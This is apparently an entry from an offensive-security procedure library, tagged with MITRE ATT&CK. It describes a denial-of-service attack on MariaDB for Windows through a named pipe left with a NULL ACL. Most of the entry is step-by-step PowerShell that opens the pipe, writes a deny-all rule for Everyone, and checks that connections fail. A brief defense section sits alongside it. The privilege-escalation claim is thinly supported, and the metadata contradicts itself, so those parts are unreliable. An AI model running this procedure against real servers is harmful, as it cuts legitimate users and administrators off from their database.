---
id: proc-mariadb-pipe-modify-001
tags:
  - mariadb
  - windows
  - acl-modification
  - dos
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File Permissions Modification]]'
updated_at: '2025-12-14T17:28:52.022Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[File Permissions Modification]]'
---
# Modify-MariaDB-Pipe-Permissions-via-NULL-ACL

## Summary

This procedure exploits a vulnerability in MariaDB server on Windows where a NULL ACL is set on a named pipe's security descriptor, allowing any local user to modify permissions and deny access to the database service, resulting in denial of service or potential privilege escalation by locking out administrators.

## Description

The vulnerability stems from the MariaDB source code in mysqld.cc (line 2761 in 10.3 branch), where SetSecurityDescriptorDacl(&sdPipeDescriptor, TRUE, NULL, FALSE) is called, creating a NULL ACL. A NULL ACL means no explicit permissions are denied or allowed, permitting any authenticated user to alter the security descriptor. An attacker with local access can open the pipe, retrieve its security descriptor, and apply a deny-all rule for the Everyone group, preventing legitimate connections to the MariaDB service. This affects Windows builds of MariaDB and requires the server to be running with the vulnerable code. Expected outcomes include service unavailability until restart or ACL reset by an admin with recovery tools.

## Requirements

1. Local access to a Windows system running vulnerable MariaDB (10.3 branch or equivalent)
2. Knowledge of the named pipe name used by MariaDB (e.g., \\.\pipe\MariaDB, configurable)
3. Permissions to open pipe handles (granted by NULL ACL)
4. PowerShell or Windows API access for descriptor manipulation

## Defense

Defensive measures and detection strategies:

- Compile MariaDB with explicit ACLs in pipe creation (patch the source code to set a proper DACL)
- Run MariaDB under restricted user accounts and monitor pipe objects with Sysmon or Process Monitor for unauthorized ACL changes
- Enable Windows auditing for object access on pipes and review event logs for SetSecurityDescriptorDacl calls or ACL modifications
- Use integrity levels or protected processes to limit local user modifications

## Objectives

1. Gain unauthorized control over MariaDB pipe access
2. Deny service to all users, including admins, for disruption
3. Potentially escalate privileges by forcing admin intervention

## Instructions

### Step 1: Identify the MariaDB Named Pipe

**Context**: Locate the vulnerable pipe created by the mysqld process, which has the NULL ACL due to the source code flaw.

Use Task Manager or PowerShell to find the pipe:

```powershell
Get-Process mysqld | Select-Object ProcessName, Id
# Then use pipelist from Sysinternals or PowerShell to list pipes
# Example: Download and run pipelist.exe if available, or use API calls
```

> This lists active named pipes; look for MariaDB-related ones. Expected output: Pipe name like \\.\pipe\MariaDB.

### Step 2: Open and Modify the Pipe Security Descriptor

**Context**: Exploit the NULL ACL to set a deny-all permission, blocking access.

Use PowerShell to connect and alter the descriptor:

```powershell
$pipeName = "\\.\pipe\MariaDB"  # Replace with actual pipe name
$pipeStream = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::InOut)
try {
    $pipeStream.Connect(5000)  # Timeout in ms
    $security = New-Object System.Security.AccessControl.PipeSecurity
    $security.SetAccessRuleProtection($true, $false)
    $denyAll = New-Object System.Security.AccessControl.PipeAccessRule("Everyone", [System.Security.AccessControl.PipeAccessRights]::FullControl, [System.Security.AccessControl.AccessControlType]::Deny)
    $security.AddAccessRule($denyAll)
    $pipeStream.SetAccessControl($security)
    Write-Output "ACL modified successfully."
} catch {
    Write-Output "Error: $($_.Exception.Message)"
} finally {
    $pipeStream.Dispose()
}
```

> This command opens the pipe, sets protection, adds a deny rule for Everyone, and applies it. Expected output: Confirmation of modification; test by attempting a new connection which should fail with 'Access is denied'.

### Step 3: Verify Denial of Service

**Context**: Confirm the exploit by testing access to MariaDB.

Attempt to connect using mysql client or API:

```powershell
# Example: Try to query the server
mysql -h localhost -u root -p  # Should fail with connection error
```

> Expected output: Error like 'ERROR 2003 (HY000): Can't connect to MySQL server'. Success if all connections are blocked.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation
- [[Impact]] Impact

### Techniques

- [[File Permissions Modification]] File and Directory Permissions Modification

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- mariadb
- windows
- acl-modification
- dos
